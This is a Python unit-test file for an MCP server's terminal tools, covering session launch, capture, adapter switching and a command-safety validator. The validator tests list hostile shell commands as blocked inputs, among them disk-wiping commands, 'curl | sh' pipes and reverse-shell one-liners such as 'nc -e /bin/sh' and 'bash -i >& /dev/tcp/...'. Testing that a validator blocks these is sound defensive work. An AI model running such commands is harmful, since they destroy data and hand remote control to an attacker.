"""Unit tests for mahavishnu.mcp.tools.terminal_tools."""

from __future__ import annotations

from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from mahavishnu.mcp.tools.terminal_tools import (
    DANGEROUS_COMMAND_PATTERNS,
    register_terminal_tools,
    validate_command_safety,
)

pytestmark = pytest.mark.unit


# =============================================================================
# Fixtures
# =============================================================================


@pytest.fixture
def mock_mcp():
    """Build a mock FastMCP that captures decorated tool functions."""
    mcp = MagicMock()
    mcp._tools = {}

    def tool_decorator():
        def wrapper(fn):
            mcp._tools[fn.__name__] = fn
            return fn

        return wrapper

    mcp.tool = MagicMock(side_effect=lambda: tool_decorator())
    return mcp


@pytest.fixture
def mock_terminal_manager():
    """Build a mock TerminalManager with AsyncMock methods."""
    mgr = MagicMock()
    mgr.launch_sessions = AsyncMock(return_value=["session-1", "session-2"])
    mgr.send_command = AsyncMock()
    mgr.capture_output = AsyncMock(return_value="output line 1\noutput line 2")
    mgr.capture_all_outputs = AsyncMock(return_value={"session-1": "out-1", "session-2": "out-2"})
    mgr.list_sessions = AsyncMock(return_value=[{"id": "session-1"}, {"id": "session-2"}])
    mgr.close_session = AsyncMock()
    mgr.close_all = AsyncMock()
    mgr.switch_adapter = AsyncMock()
    mgr.current_adapter = MagicMock(return_value="mcpretentious")
    mgr.get_adapter_history = MagicMock(return_value=[{"from": "old", "to": "new"}])
    mgr.adapter = MagicMock()
    return mgr


@pytest.fixture
def registered_mcp(mock_mcp, mock_terminal_manager):
    """Register terminal tools on the mock MCP."""
    register_terminal_tools(mock_mcp, mock_terminal_manager)
    return mock_mcp


# =============================================================================
# validate_command_safety
# =============================================================================


class TestValidateCommandSafety:
    """Tests for the validate_command_safety helper."""

    def test_safe_command_passes(self):
        """A benign command should not raise."""
        validate_command_safety("ls -la")
        validate_command_safety("echo hello world")
        validate_command_safety("git status")

    def test_dangerous_patterns_constant(self):
        """DANGEROUS_COMMAND_PATTERNS should be non-empty."""
        assert len(DANGEROUS_COMMAND_PATTERNS) > 0
        # Check for some known dangerous patterns
        assert "rm -rf /" in DANGEROUS_COMMAND_PATTERNS

    @pytest.mark.parametrize(
        "bad_command",
        [
            "rm -rf /",
            "rm -rf /tmp",
            "mkfs.ext4 /dev/sda1",
            "dd if=/dev/zero of=/dev/sda",
            "echo test > /dev/sda1",
            "chmod 000 /etc/passwd",
            "chown root: myfile",
            "curl | sh",
            "wget | sh",
            "ls && rm -rf /",
            "ls ; rm file",
            "echo hi | rm file",
            "nc -e /bin/sh 1.2.3.4 1234",
            "ncat -e /bin/sh 1.2.3.4 1234",
            "bash -i >& /dev/tcp/1.2.3.4/443 0>&1",
            "cat /dev/udp/127.0.0.1/53",
            "echo bind shell",
            "echo reverse shell",
            "kill -9 1234",
            "pkill -9 python",
            "killall python",
        ],
    )
    def test_dangerous_command_raises(self, bad_command):
        """Each dangerous command pattern should raise ValueError."""
        with pytest.raises(ValueError, match="dangerous pattern"):
            validate_command_safety(bad_command)

    def test_case_insensitive_match(self):
        """Pattern matching should be case-insensitive."""
        with pytest.raises(ValueError, match="dangerous pattern"):
            validate_command_safety("RM -RF /")


# =============================================================================
# Tool Registration
# =============================================================================


class TestRegistration:
    """Tests for register_terminal_tools."""

    def test_all_tools_registered(self, registered_mcp):
        """All terminal tools should be registered."""
        expected = {
            "terminal_launch",
            "terminal_send",
            "terminal_capture",
            "terminal_capture_all",
            "terminal_list",
            "terminal_close",
            "terminal_close_all",
            "terminal_switch_adapter",
            "terminal_current_adapter",
            "terminal_list_adapters",
            "terminal_list_profiles",
            "terminal_launch_with_profile",
        }
        assert expected.issubset(set(registered_mcp._tools.keys()))


# =============================================================================
# terminal_launch
# =============================================================================


class TestTerminalLaunch:
    """Tests for the terminal_launch tool."""

    async def test_launch_returns_session_ids(self, registered_mcp, mock_terminal_manager):
        """Should return the list of session ids from the manager."""
        result = await registered_mcp._tools["terminal_launch"](command="ls")
        assert result == ["session-1", "session-2"]
        mock_terminal_manager.launch_sessions.assert_awaited_once()

    async def test_launch_passes_dimensions(self, registered_mcp, mock_terminal_manager):
        """count, columns, rows should be passed to the manager."""
        await registered_mcp._tools["terminal_launch"](command="ls", count=2, columns=100, rows=20)
        mock_terminal_manager.launch_sessions.assert_awaited_with("ls", 2, 100, 20)

    async def test_launch_blocks_dangerous_command(self, registered_mcp, mock_terminal_manager):
        """A dangerous command should raise ValueError."""
        with pytest.raises(ValueError, match="dangerous pattern"):
            await registered_mcp._tools["terminal_launch"](command="rm -rf /")


# =============================================================================
# terminal_send
# =============================================================================


class TestTerminalSend:
    """Tests for the terminal_send tool."""

    async def test_send_returns_status(self, registered_mcp, mock_terminal_manager):
        """Result should be a status dict with session_id and command."""
        result = await registered_mcp._tools["terminal_send"](
            session_id="session-1", command="ls -la"
        )
        assert result["status"] == "success"
        assert result["session_id"] == "session-1"
        assert result["command"] == "ls -la"
        mock_terminal_manager.send_command.assert_awaited_with("session-1", "ls -la")

    async def test_send_blocks_dangerous_command(self, registered_mcp):
        """A dangerous command should raise ValueError before send_command is called."""
        with pytest.raises(ValueError, match="dangerous pattern"):
            await registered_mcp._tools["terminal_send"](session_id="s1", command="kill -9 1234")


# =============================================================================
# terminal_capture / terminal_capture_all
# =============================================================================


class TestTerminalCapture:
    """Tests for the terminal_capture and terminal_capture_all tools."""

    async def test_capture_returns_output(self, registered_mcp):
        """terminal_capture should return the output string."""
        result = await registered_mcp._tools["terminal_capture"](session_id="s1")
        assert "output line 1" in result

    async def test_capture_passes_lines(self, registered_mcp, mock_terminal_manager):
        """lines parameter should be forwarded to manager."""
        await registered_mcp._tools["terminal_capture"](session_id="s1", lines=10)
        mock_terminal_manager.capture_output.assert_awaited_with("s1", 10)

    async def test_capture_all_returns_map(self, registered_mcp):
        """terminal_capture_all should return a map of session id to output."""
        result = await registered_mcp._tools["terminal_capture_all"](session_ids=["s1", "s2"])
        assert result == {"session-1": "out-1", "session-2": "out-2"}


# =============================================================================
# terminal_list
# =============================================================================


class TestTerminalList:
    """Tests for the terminal_list tool."""

    async def test_list_returns_sessions(self, registered_mcp):
        """Should return the list from manager."""
        result = await registered_mcp._tools["terminal_list"]()
        assert result == [{"id": "session-1"}, {"id": "session-2"}]


# =============================================================================
# terminal_close
# =============================================================================


class TestTerminalClose:
    """Tests for the terminal_close tool."""

    async def test_close_session(self, registered_mcp, mock_terminal_manager):
        """Should call close_session with given id."""
        await registered_mcp._tools["terminal_close"](session_id="s1")
        mock_terminal_manager.close_session.assert_awaited_with("s1")


# =============================================================================
# terminal_close_all
# =============================================================================


class TestTerminalCloseAll:
    """Tests for the terminal_close_all tool."""

    async def test_close_all(self, registered_mcp, mock_terminal_manager):
        """Should close all sessions and report count."""
        result = await registered_mcp._tools["terminal_close_all"]()
        assert result == {"closed_count": 2}
        mock_terminal_manager.close_all.assert_awaited_with(["session-1", "session-2"])

    async def test_close_all_empty(self, registered_mcp, mock_terminal_manager):
        """If no sessions, close_all should still return closed_count=0."""
        mock_terminal_manager.list_sessions = AsyncMock(return_value=[])
        result = await registered_mcp._tools["terminal_close_all"]()
        assert result == {"closed_count": 0}
        mock_terminal_manager.close_all.assert_not_awaited()

    async def test_close_all_fallback_to_terminal_id(self, registered_mcp, mock_terminal_manager):
        """If 'id' is missing, fall back to 'terminal_id' key."""
        mock_terminal_manager.list_sessions = AsyncMock(return_value=[{"terminal_id": "s1"}])
        result = await registered_mcp._tools["terminal_close_all"]()
        assert result == {"closed_count": 1}
        mock_terminal_manager.close_all.assert_awaited_with(["s1"])


# =============================================================================
# terminal_switch_adapter
# =============================================================================


class TestTerminalSwitchAdapter:
    """Tests for the terminal_switch_adapter tool."""

    async def test_switch_to_mcpretentious(self, mock_terminal_manager):
        """Switching to mcpretentious should construct a new adapter and call switch_adapter."""
        # Pretend the current adapter is something else so the switch happens
        mock_terminal_manager.current_adapter = MagicMock(return_value="other")
        mcp_client = MagicMock()
        # Build a fresh registration with a different starting adapter
        new_mcp = MagicMock()
        new_mcp._tools = {}
        new_mcp.tool = MagicMock(
            side_effect=lambda: lambda fn: (new_mcp._tools.update({fn.__name__: fn}), fn)[1]
        )
        with patch("mahavishnu.mcp.tools.terminal_tools.ITERM2_AVAILABLE", False):
            register_terminal_tools(new_mcp, mock_terminal_manager, mcp_client)
        result = await new_mcp._tools["terminal_switch_adapter"](adapter_name="mcpretentious")
        assert result["status"] == "success"
        assert result["new_adapter"] == "mcpretentious"
        mock_terminal_manager.switch_adapter.assert_awaited()

    async def test_switch_already_using(self, registered_mcp, mock_terminal_manager):
        """If we are already using the requested adapter, return already_using."""
        result = await registered_mcp._tools["terminal_switch_adapter"](
            adapter_name="mcpretentious"
        )
        assert result["status"] == "already_using"
        assert result["current_adapter"] == "mcpretentious"

    async def test_switch_unknown_adapter(self, registered_mcp):
        """An unknown adapter name should return an error payload."""
        result = await registered_mcp._tools["terminal_switch_adapter"](
            adapter_name="not-a-real-adapter"
        )
        assert result["status"] == "error"
        assert "Unknown adapter" in result["message"]

    async def test_switch_iterm2_unavailable(self, registered_mcp):
        """If iterm2 is requested but unavailable, return an error."""
        with patch("mahavishnu.mcp.tools.terminal_tools.ITERM2_AVAILABLE", False):
            result = await registered_mcp._tools["terminal_switch_adapter"](adapter_name="iterm2")
        assert result["status"] == "error"
        assert "iTerm2 adapter not available" in result["message"]

    async def test_switch_iterm2_init_failure(self, registered_mcp):
        """If ITerm2Adapter construction fails, return an error."""
        with (
            patch("mahavishnu.mcp.tools.terminal_tools.ITERM2_AVAILABLE", True),
            patch(
                "mahavishnu.mcp.tools.terminal_tools.ITerm2Adapter",
                side_effect=RuntimeError("init failed"),
            ),
        ):
            result = await registered_mcp._tools["terminal_switch_adapter"](adapter_name="iterm2")
        assert result["status"] == "error"
        assert "Failed to initialize iTerm2" in result["message"]

    async def test_switch_mcpretentious_requires_mcp_client(self, mock_terminal_manager):
        """Switching to mcpretentious without an mcp_client should return an error."""
        mock_terminal_manager.current_adapter = MagicMock(return_value="other")
        new_mcp = MagicMock()
        new_mcp._tools = {}
        new_mcp.tool = MagicMock(
            side_effect=lambda: lambda fn: (new_mcp._tools.update({fn.__name__: fn}), fn)[1]
        )
        with patch("mahavishnu.mcp.tools.terminal_tools.ITERM2_AVAILABLE", False):
            register_terminal_tools(new_mcp, mock_terminal_manager, mcp_client=None)
        result = await new_mcp._tools["terminal_switch_adapter"](adapter_name="mcpretentious")
        assert result["status"] == "error"
        assert "mcpretentious adapter requires MCP client" in result["message"]

    async def test_switch_adapter_failure(self, mock_terminal_manager):
        """If the manager raises during switch, return an error."""
        mock_terminal_manager.current_adapter = MagicMock(return_value="other")
        mock_terminal_manager.switch_adapter.side_effect = RuntimeError("nope")
        mcp_client = MagicMock()
        new_mcp = MagicMock()
        new_mcp._tools = {}
        new_mcp.tool = MagicMock(
            side_effect=lambda: lambda fn: (new_mcp._tools.update({fn.__name__: fn}), fn)[1]
        )
        with patch("mahavishnu.mcp.tools.terminal_tools.ITERM2_AVAILABLE", False):
            register_terminal_tools(new_mcp, mock_terminal_manager, mcp_client)
        result = await new_mcp._tools["terminal_switch_adapter"](adapter_name="mcpretentious")
        assert result["status"] == "error"
        assert "Failed to switch adapter" in result["message"]


# =============================================================================
# terminal_current_adapter
# =============================================================================


class TestTerminalCurrentAdapter:
    """Tests for the terminal_current_adapter tool."""

    async def test_returns_adapter_info(self, registered_mcp):
        """Should return current adapter and history."""
        result = await registered_mcp._tools["terminal_current_adapter"]()
        assert result["adapter"] == "mcpretentious"
        assert "history" in result


# =============================================================================
# terminal_list_adapters
# =============================================================================


class TestTerminalListAdapters:
    """Tests for the terminal_list_adapters tool."""

    async def test_list_adapters_iterm2_available(self, registered_mcp):
        """When iterm2 is available, both adapters should be available."""
        with patch("mahavishnu.mcp.tools.terminal_tools.ITERM2_AVAILABLE", True):
            result = await registered_mcp._tools["terminal_list_adapters"]()
        assert result["adapters"]["iterm2"]["status"] == "available"
        assert result["adapters"]["mcpretentious"]["status"] == "available"
        assert result["current"] == "mcpretentious"

    async def test_list_adapters_iterm2_unavailable(self, registered_mcp):
        """When iterm2 is unavailable, it should be marked unavailable."""
        with patch("mahavishnu.mcp.tools.terminal_tools.ITERM2_AVAILABLE", False):
            result = await registered_mcp._tools["terminal_list_adapters"]()
        assert result["adapters"]["iterm2"]["status"] == "unavailable"
        assert result["adapters"]["mcpretentious"]["status"] == "available"


# =============================================================================
# terminal_list_profiles
# =============================================================================


class TestTerminalListProfiles:
    """Tests for the terminal_list_profiles tool."""

    async def test_list_profiles_wrong_adapter(self, registered_mcp):
        """When not using iterm2, return an error."""
        result = await registered_mcp._tools["terminal_list_profiles"]()
        assert result["status"] == "error"
        assert result["current_adapter"] == "mcpretentious"
        assert result["profiles"] == []

    async def test_list_profiles_no_connection(self, registered_mcp, mock_terminal_manager):
        """If iTerm2 adapter has no connection, return an error."""
        mock_terminal_manager.current_adapter = MagicMock(return_value="iterm2")
        mock_terminal_manager.adapter._connection = None
        result = await registered_mcp._tools["terminal_list_profiles"]()
        assert result["status"] == "error"
        assert "not connected" in result["message"]

    async def test_list_profiles_success(self, registered_mcp, mock_terminal_manager):
        """Successful profile listing returns names."""
        mock_terminal_manager.current_adapter = MagicMock(return_value="iterm2")
        mock_terminal_manager.adapter._connection = MagicMock()

        # Mock the iterm2 module import within the function
        mock_profiles = [MagicMock(name="Default"), MagicMock(name="Dark")]
        mock_profiles[0].name = "Default"
        mock_profiles[1].name = "Dark"
        mock_iterm2_module = MagicMock()
        mock_iterm2_module.Profile.async_get_all = AsyncMock(return_value=mock_profiles)

        with patch.dict("sys.modules", {"iterm2": mock_iterm2_module}):
            result = await registered_mcp._tools["terminal_list_profiles"]()
        assert result["status"] == "success"
        assert result["profiles"] == ["Default", "Dark"]
        assert result["count"] == 2

    async def test_list_profiles_failure(self, registered_mcp, mock_terminal_manager):
        """If the iterm2 call fails, return an error."""
        mock_terminal_manager.current_adapter = MagicMock(return_value="iterm2")
        mock_terminal_manager.adapter._connection = MagicMock()
        mock_iterm2_module = MagicMock()
        mock_iterm2_module.Profile.async_get_all = AsyncMock(side_effect=RuntimeError("boom"))
        with patch.dict("sys.modules", {"iterm2": mock_iterm2_module}):
            result = await registered_mcp._tools["terminal_list_profiles"]()
        assert result["status"] == "error"
        assert "boom" in result["message"]


# =============================================================================
# terminal_launch_with_profile
# =============================================================================


class TestTerminalLaunchWithProfile:
    """Tests for the terminal_launch_with_profile tool."""

    async def test_wrong_adapter_raises(self, registered_mcp):
        """If not using iterm2, should raise RuntimeError."""
        with pytest.raises(RuntimeError, match="Profile selection requires iTerm2 adapter"):
            await registered_mcp._tools["terminal_launch_with_profile"](
                command="ls", profile_name="Default"
            )

    async def test_iterm2_launches_with_profile(self, registered_mcp, mock_terminal_manager):
        """When using iterm2, should call launch_sessions with profile_name."""
        mock_terminal_manager.current_adapter = MagicMock(return_value="iterm2")
        result = await registered_mcp._tools["terminal_launch_with_profile"](
            command="ls", profile_name="Default", count=1
        )
        assert result == ["session-1", "session-2"]
        mock_terminal_manager.launch_sessions.assert_awaited()
